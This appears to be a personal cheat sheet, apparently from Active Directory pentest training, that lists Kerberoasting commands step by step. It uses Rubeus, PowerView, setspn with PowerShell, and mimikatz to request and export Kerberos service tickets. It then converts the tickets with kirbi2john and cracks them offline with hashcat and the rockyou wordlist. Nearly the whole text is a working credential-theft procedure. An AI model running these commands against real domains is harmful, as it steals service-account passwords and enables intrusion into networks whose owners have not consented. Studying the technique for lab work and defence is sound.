## using rubeus 
```
.\Rubeus.exe kerberoast 

.\Rubeus.exe kerberoast /stats
```

```
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

```powershell-session
.\Rubeus.exe kerberoast /user:MSSQLSvc /nowrap
```

then crack hash with hashcat -m 13100 (it might not always be rc4 it might be other algo, check)

request only rc4 encrypted ticket
```
.\Rubeus.exe kerberoast /tgtdeleg /user:username /nowrap
```
## use powerview to extract tgs tickets
```
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samacountname
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```
export all tickets to a csv file
```
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

## Semi Manual Method with built in binary
```
cmd: setspn.exe -Q */*
```
focus on the user account and ignore computer accounts 
then use powershell to request tgs tickets and load them into memory
PS 
```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```
then we use mimikatz to extract them 
```
base64 /out:true
kerberos::list /export
```

in our attackbox we just convert the base64 back to .kirbi file
```
echo "<base64 blob>" |  tr -d \\n 
cat encoded_file | base64 -d > sqldev.kirbi
```

then extract the kerberos ticket using kirbi2john 
```
python2.7 kirbi2john.py crackfile
```

hashcat cracking
```
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat

hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 
```